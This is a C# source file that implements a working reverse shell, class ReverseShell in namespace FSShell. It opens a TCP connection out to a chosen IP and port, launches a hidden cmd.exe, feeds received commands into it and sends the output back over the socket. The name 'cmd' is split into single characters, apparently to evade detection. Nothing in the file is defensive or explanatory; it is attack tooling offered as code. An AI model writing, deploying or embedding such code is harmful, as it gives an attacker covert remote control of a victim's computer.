using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace FSShell
{
    public class ReverseShell
    {
		private StreamWriter sw;
		private string _ip;
        private int _port;

        public void Start(string ip, int port)
        {
            _ip = ip;
            _port = port;

            Thread shell = new Thread(StartServer);
            shell.Start();
        }

        private void StartServer()
        {
            IPAddress ip;
            if (!IPAddress.TryParse(_ip, out ip))
            {
                throw new FormatException("Invalid ip-adress");
            }

            IPEndPoint remoteEP = new IPEndPoint(ip, _port);

            using (TcpClient client = new TcpClient())
            {
                client.Connect(remoteEP);

                using (Stream stream = client.GetStream())
                {
                    using (StreamReader rdr = new StreamReader(stream))
                    {
                        sw = new StreamWriter(stream);

                        Process p = StartProcess();

                        while (true)
                        {
                            try
                            {
                                string input = rdr.ReadLine();
                                
                                if (input.ToLower() == "exit")
                                    break;

                                p.StandardInput.WriteLine(input);
                            }
                            catch (Exception) { }
                        }
                    }
                }
            }
        }

		private Process StartProcess()
        {
            Process p = new Process();
            string cmd = "c" + "m" + "d";
            p.StartInfo.FileName = cmd;
            p.StartInfo.CreateNoWindow = true;
            p.StartInfo.UseShellExecute = false;
            p.StartInfo.RedirectStandardOutput = true;
            p.StartInfo.RedirectStandardInput = true;
            p.StartInfo.RedirectStandardError = true;
            p.OutputDataReceived += new DataReceivedEventHandler(DataHnd);
            p.Start();
            p.BeginOutputReadLine();

            return p;
        }

		private void DataHnd(object sendingProcess, DataReceivedEventArgs outLine)
		{
            string data = outLine.Data;

            if (!String.IsNullOrEmpty(data))
			{
				try
				{
                    sw.WriteLine(data);
                    sw.Flush();
				}
				catch (Exception) { }
			}
		}
    }
}
